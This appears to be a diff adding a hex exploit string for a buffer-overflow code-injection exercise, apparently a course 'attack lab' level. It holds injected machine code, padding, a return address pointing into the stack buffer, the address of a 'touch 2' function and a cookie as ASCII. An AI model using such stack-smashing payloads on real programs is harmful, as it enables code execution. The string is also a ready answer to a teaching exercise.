@@ -1,0 +1,8 @@
+48 c7 c7 00 af 67 55 c3 /*%rsp + 0x38 (buffer + 16)*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /*buffer size*/
+c8 ae 67 55 00 00 00 00 /*return address %rsp*/
+65 13 40 00 00 00 00 00 /*address touch 2*/
+33 65 38 34 36 61 62 35 /*cookie converted to text format*/
